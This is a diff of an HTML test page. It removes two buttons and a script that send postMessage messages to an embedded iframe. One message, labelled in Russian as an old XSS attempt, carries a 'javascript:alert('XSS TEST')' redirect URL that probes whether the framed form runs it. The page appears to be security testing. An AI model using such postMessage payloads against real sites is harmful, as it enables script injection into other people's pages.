@@ -29,30 +29,5 @@
 
 <br><br>
 
-<button onclick="sendRedirect()">Попробовать redirect (старый XSS)</button>
-<button onclick="sendHeight()">Попробовать height-adjustment</button>
-
-<script>
-function sendRedirect() {
-  const iframe = document.getElementById('formFrame');
-
-  iframe.contentWindow.postMessage(JSON.stringify({
-    source: "ak",
-    type: "redirect",
-    data: { url: "javascript:alert('XSS TEST')" }
-  }), "*");
-}
-
-function sendHeight() {
-  const iframe = document.getElementById('formFrame');
-
-  iframe.contentWindow.postMessage(JSON.stringify({
-    source: "ak",
-    type: "height-adjustment",
-    data: { "iframe-height": 300 }
-  }), "*");
-}
-</script>
-
 </body>
 </html>
